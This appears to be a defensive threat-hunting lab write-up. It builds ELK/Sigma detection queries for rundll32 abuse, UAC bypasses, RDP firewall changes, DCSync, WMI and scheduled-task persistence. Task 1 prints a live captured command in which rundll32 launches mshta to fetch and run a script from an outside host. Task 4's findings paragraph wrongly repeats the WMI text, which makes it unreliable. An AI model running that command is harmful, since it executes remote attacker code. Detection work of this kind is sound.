---
title: Hunting With ELK 2
categories: [Writeup threat_hunting]
tags: [eLearn, threat_hunting, elk, kibana, siem]
---
# Scenario 
**Resolvn Threat Hunting Virtual Machine (RTHVM)**

The IT Security manager provided you with simulated malicious activity and has asked you to create hunting detection techniques for all of it.

## Task 1. Hunt for malicious use of rundll32
By employing the sigma rules win_susp_rundll32_activity.yml rules, we can effectively detect and identify processes associated with the malicious utilization of rundll32.

```
((process.args:("*javascript\:*" OR "*.RegisterXLL*")) OR ((process.args:"*url.dll*" AND process.args:"*OpenURL*")) OR ((process.args:"*url.dll*" AND process.args:"*OpenURLA*")) OR ((process.args:"*url.dll*" AND process.args:"*FileProtocolHandler*")) OR ((process.args:"*zipfldr.dll*" AND process.args:"*RouteTheCall*")) OR ((process.args:"*shell32.dll*" AND process.args:"*Control_RunDLL*")) OR ((process.args:"*shell32.dll*" AND process.args:"*ShellExec_RunDLL*")) OR ((process.args:"*mshtml.dll*" AND process.args:"*PrintHTML*")) OR ((process.args:"*advpack.dll*" AND process.args:"*LaunchINFSection*")) OR ((process.args:"*advpack.dll*" AND process.args:"*RegisterOCX*")) OR ((process.args:"*ieadvpack.dll*" AND process.args:"*LaunchINFSection*")) OR ((process.args:"*ieadvpack.dll*" AND process.args:"*RegisterOCX*")) OR ((process.args:"*ieframe.dll*" AND process.args:"*OpenURL*")) OR ((process.args:"*shdocvw.dll*" AND process.args:"*OpenURL*")) OR ((process.args:"*syssetup.dll*" AND process.args:"*SetupInfObjectInstallAction'*")) OR ((process.args:"*setupapi.dll*" AND process.args:"*InstallHinfSection*")) OR ((process.args:"*pcwutl.dll*" AND process.args:"*LaunchApplication*")) OR ((process.args:"*dfshim.dll*" AND process.args:"*ShOpenVerbApplication*")))
```

![]({{site.baseurl}}/assets/img/2023-07-31-eLearnSec-HuntingWithELK-2.jpg){: width="972" height="589" }

```
cmd.exe, /C, rundll32.exe, javascript:\..\mshtml,RunHTMLApplication ;document.write();h=new%%20ActiveXObject(WScript.Shell).run(mshta https://hotelesms.com/talsk.txt,0,true);
```

The query yielded 8 hits that involve the misuse of rundll32.exe. The initial instance shows the execution of code from the internet, where rundll32.exe is utilized to run a JavaScript script downloaded from a remote website  hotelsms[.]com/talsk[.]txt [ref](https://attack.mitre.org/techniques/T1218/011/)

## Task 2. Hunt for UAC Bypass leveraging cliconfg.exe
UAC bypass technique that leverages cliconfg.exe. We can utilize Sysmon event ID 7, focusing on the process executable for cliconfg.exe, and filter for the file path of the "NTWDBLIB.dll" dynamic-link library (DLL) file, commonly known as the "SQL Server Client Library." [ref](https://attack.mitre.org/techniques/T1548/002/)

```
event.id: 7 AND process.executable : cliconfg.exe AND file.path : *NTWDBLIB.dll*
```

![]({{site.baseurl}}/assets/img/2023-07-31-eLearnSec-HuntingWithELK-2-1.jpg){: width="972" height="589" }
  
We have successfully obtained one match based on our query, revealing the UAC bypass involving cliconfig.exe. Furthermore, by filtering the process ID of the event, which is 880, we gain insights into the specific tool employed by the threat actor.


![]({{site.baseurl}}/assets/img/2023-07-31-eLearnSec-HuntingWithELK-2-2.jpg){: width="972" height="589" }


Upon further examination, it becomes evident that the threat actor has employed a UAC bypass technique known as [WinPwnage](https://github.com/rootm0s/WinPwnage#uac-bypass-techniques),  with a flag option of -i 11 which relies on token manipulation. Token manipulation is a method utilized to modify user access tokens, which are security descriptors containing information about a user's privileges and group memberships.  [ref](https://attack.mitre.org/techniques/T1548/002/)


## Task 3. Hunt for RDP settings tampering
To initiate the hunt for RDP settings tampering, we can begin our query by filtering for the process executable "netsh.exe" Additionally, we should include an "add rule" for capturing specific event details that may be indicative of RDP settings manipulation.

```
(((process.executable:"*\\netsh.exe") OR (winlog.event_data.OriginalFileName:"netsh.exe")) AND (process.args:"*\ firewall\ *" AND process.args:"*\ add\ *"))
```

![]({{site.baseurl}}/assets/img/2023-07-31-eLearnSec-HuntingWithELK-2-3.jpg){: width="972" height="589" }
The query returned one hit, the threat actor used the "netsh" command to add a firewall rule named "Remote Desktop" with TCP port 3389 allowed for inbound traffic. This could potentially grant unauthorized access through RDP. [ref](https://attack.mitre.org/techniques/T1021/001/)

## Task 4. Hunt for DCSync
Hunting for DCSync, we can use Sigma rule win_dcsync. The rule searches for event ID 4662, which is often related to permissions modifications in Active Directory. To eliminate common legitimate accounts, it excludes user names ending with "*" and specific built-in accounts such as "AUTHORITY" and "Window." The rule focuses on objects with properties matching the DCSync schema identifier (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) or objects related to replication (object.properties:Replicating). 

```
event.id:4662 AND NOT (user.name:*$ OR user.name:AUTHORITY OR user.name:Window) AND (object.properties:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 OR object.properties:Replicating)
```

![]({{site.baseurl}}/assets/img/2023-07-31-eLearnSec-HuntingWithELK-2-4.jpg){: width="972" height="589" }
With our query, we obtained three hits, suggesting the presence of Remote WMI Usage technique. these process being used could potentially indicate attempts by threat actors to leverage WMI for remote code execution or to gather system information from the target systems. [ref](https://d3fend.mitre.org/offensive-technique/attack/T1003.006/)

## Task 5. Hunt for Remote WMI Usage
To hunt for the Remote WMI Usage technique, we can begin by focusing on event ID 4648 and filtering for the process parent name of "WMIC.exe." This combination can help us identify potential instances where WMI (Windows Management Instrumentation) is being used remotely.

```
event.id : 4648 and process.parent.name : *wmi*
```

![]({{site.baseurl}}/assets/img/2023-07-31-eLearnSec-HuntingWithELK-2-5.jpg){: width="972" height="589" }


With our query, we obtained three hits, suggesting the presence of Remote WMI Usage technique. The three instances of the "WMIC.exe" process being used could potentially indicate attempts by threat actors to leverage WMI for remote code execution or to gather system information from the target systems. [ref](https://attack.mitre.org/techniques/T1047/)


## Task 6. Hunt for persistence through scheduled Tasks
To begin hunting for persistence through scheduled tasks, we will initiate our query by focusing on process name "schtasks" and Sysmon event ID 1, which indicates process creation. 
```
 process.name:schtasks AND event.id:1
```

![]({{site.baseurl}}/assets/img/2023-07-31-eLearnSec-HuntingWithELK-2-6.jpg){: width="972" height="589" }
Based on the query, we obtained one hit that reveals the usage of the "schtasks" process to create a scheduled task. This scheduled task creation indicates a potential persistence mechanism used by threat actors to execute a suspicious file ("mshta.exe") from the system's "System32" directory with a command-line argument from an external URL ("hxxps[://]hotelesms[.]com/Injection[.]txt") every 6 minutes when a user logs on. [ref](https://attack.mitre.org/techniques/T1218/005/ )

## Task 7. Hunt for UAC Bypass leveraging SDCLT.EXE
The SDCLT UAC bypass takes advantage of the fact that SDCLT.exe is a trusted Microsoft application that is not subject to UAC prompts. Attackers can leverage this behavior to execute arbitrary code with elevated privileges, potentially allowing them to perform unauthorized actions on the system, compromise its security, and gain persistence.
To hunt for UAC bypass leveraging SDCLT.exe, we can start by focusing on the process with the executable name "sdclt.exe" and filtering for arguments containing "kickoffelev". 

```
process.executable : sdclt.exe AND process.args : *kickoffelev*
```

![]({{site.baseurl}}/assets/img/2023-07-31-eLearnSec-HuntingWithELK-2-7.jpg){: width="972" height="589" }

The presence of one hit indicates the usage of "sdclt.exe" with the argument "kickoffelev." The argument "kickoffelev" is associated with a specific UAC bypass technique known as the "[SDCLT UAC bypass.](https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/)" [ref](https://pentestlab.blog/2017/06/09/uac-bypass-sdclt/)

## Reference 
- <https://github.com/RESOLVN/RTHVM> 
- <https://attack.mitre.org/techniques/T1218/011/>
- <https://attack.mitre.org/techniques/T1548/002/>
- <https://github.com/rootm0s/WinPwnage#uac-bypass-techniques>
- <https://attack.mitre.org/techniques/T1021/001/>
- <https://d3fend.mitre.org/offensive-technique/attack/T1003.006/>
- <https://attack.mitre.org/techniques/T1047/>
- <https://attack.mitre.org/techniques/T1218/005/>
- <https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/>
- <https://pentestlab.blog/2017/06/09/uac-bypass-sdclt/> 